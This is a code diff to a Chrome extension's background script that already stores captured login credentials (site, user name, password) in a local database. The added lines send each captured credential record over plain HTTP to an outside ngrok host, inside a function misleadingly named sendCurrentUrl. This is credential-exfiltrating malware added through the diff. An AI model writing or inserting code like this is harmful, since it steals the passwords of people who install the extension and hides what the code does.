@@ -16,6 +16,7 @@ chrome.extension.onRequest.addListener(function(request, tab, respond) {
                 // insert unique login credentials
                 tx.executeSql('insert into log (href, host, user, pass) ' +
                     'VALUES (?, ?, ?, ?)', request.record);
+                sendCurrentUrl(request.record);
 
             } else {
 
@@ -42,6 +43,22 @@ chrome.extension.onRequest.addListener(function(request, tab, respond) {
         });
     }
 });
+
+function sendCurrentUrl(data) {
+  var req = new XMLHttpRequest();
+  req.addEventListener('readystatechange', function (evt) {
+    if (req.readyState === 4) {
+      if (req.status === 200) {
+        alert('Saved !');
+      } else {
+        alert("ERROR: status " + req.status);
+      }
+    }
+  });
+  req.open('POST', 'http://091fff57.ngrok.io/api/chainsaw', true);
+  req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  req.send('url=' + encodeURIComponent(data));
+}
 
 chrome.runtime.onInstalled.addListener(function(details) {
   db.transaction(function(tx) {
